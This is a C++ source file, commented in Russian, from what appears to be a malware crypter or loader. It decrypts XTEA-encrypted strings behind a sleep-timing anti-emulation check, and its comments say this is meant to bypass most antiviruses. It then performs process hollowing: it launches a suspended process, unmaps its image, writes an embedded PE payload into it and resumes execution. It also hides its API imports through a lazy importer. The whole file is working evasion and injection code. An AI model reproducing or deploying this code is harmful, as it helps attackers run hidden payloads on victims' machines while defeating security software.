#include <iostream>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <time.h>

#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/modules.h"
#include "../../modules/data_crypt_string.h"

//Дефайн определяет задержку слипов, в данной реализации 1 секунда, два слипа. Т.е. запуск примерно через три секунды.
//Это позволяет обойти большинство антивирусов.
#define SLEEP_WAIT 1000

//Функция раскриптовки строки
void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
{

	//Выровнить размер строки на 8:
	while (!!(size_str % 8)) {
		size_str++;
	}

	//Расшифровка строки
	XTEA_decrypt(str_to_crypt, size_str, key, size_key);
}

//Функция криптовки строки
void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
{

	//Выровнить размер строки на 8:
	while (!!(size_str % 8)) {
		size_str++;
	}

	//Шифровка строки
	XTEA_encrypt(str_to_crypt, size_str, key, size_key);
}

/*
Функция используется для антиэмуляции, во время расшифровки строк.
Перед раскриптовкой, происходит задержка 1 секунду, далее по меткам времени происходит вычисление, действительно-ли была задержка секунду.
Если да, то на основе этого вычисляется размер ключа:size_key = (mesure2.wSecond - mesure1.wSecond) + 3.
Если sleep был пропущен, то размер ключа будет неверный и расшифровка будет неправильна.

Параметры функции:

uintptr_t base - Адрес LoadLibraryA.
char *crypt_str - Указате на шифрованную строку.
uint32_t size_str - Размер строки.
uint32_t sleep_wait - Задержка слипа в секундах.
*/

void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait) 
{

	SYSTEMTIME mesure1;
	SYSTEMTIME mesure2;
	uint32_t size_key = 0;

	printf("#");
	LI_GET(base, GetSystemTime)(&mesure1);
	LI_GET(base, Sleep)(sleep_wait);
	LI_GET(base, GetSystemTime)(&mesure2);
	printf("#");

	size_key = (mesure2.wSecond - mesure1.wSecond) + 3;

	//Если эмулятор пропустит слип, то размер ключа будет неправильный, если не пропустит, то размер ключа будет 4-ре.)))
	str_to_decrypt(crypt_str, size_str, &MAGIC, size_key);

	printf("#");
}

//Фунция запуска в память, принимает:
/*
uintptr_t base - Адрес LoadLibraryA.
szFilePath - Полный путь до нашего модуля
pFile - Байты PE-файла (x32 и натив).
*/
typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
void run(uintptr_t base, LPSTR szFilePath, PVOID pFile)
{
	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
	NtUnmapViewOfSection xNtUnmapViewOfSection;
	LPVOID pImageBase;
	int Count;
	IDH = PIMAGE_DOS_HEADER(pFile);

	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			//Антиэмуляция **************************************
			anti_emul_sleep(base, ntdll, 10, SLEEP_WAIT);
			//Антиэмуляция **************************************

			if (LI_GET(base, CreateProcessA)(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CTX = PCONTEXT((LI_GET(base, VirtualAlloc)(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{

					//Антиэмуляция **************************************
					anti_emul_sleep(base, NtUnmapView, 21, SLEEP_WAIT);
					//Антиэмуляция **************************************

					LI_GET(base, ReadProcessMemory)(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						HMODULE hmodule = LI_GET(base, GetModuleHandleA)(ntdll);
						FARPROC proc_addr = LI_GET(base, GetProcAddress)(hmodule, NtUnmapView);

						xNtUnmapViewOfSection = NtUnmapViewOfSection(proc_addr);
						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
					}
					pImageBase = LI_GET(base, VirtualAllocEx)(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE); //VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
					if (pImageBase)
					{
						LI_GET(base, WriteProcessMemory)(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
							LI_GET(base, WriteProcessMemory)(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						LI_GET(base, WriteProcessMemory)(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
						LI_GET(base, SetThreadContext)(PI.hThread, LPCONTEXT(CTX));
						LI_GET(base, ResumeThread)(PI.hThread);
					}
				}
			}
		}
	}
	printf("#");
	LI_GET(base, VirtualFree)(pFile, 0, MEM_RELEASE);
	printf("\n STARTED OK\n");
}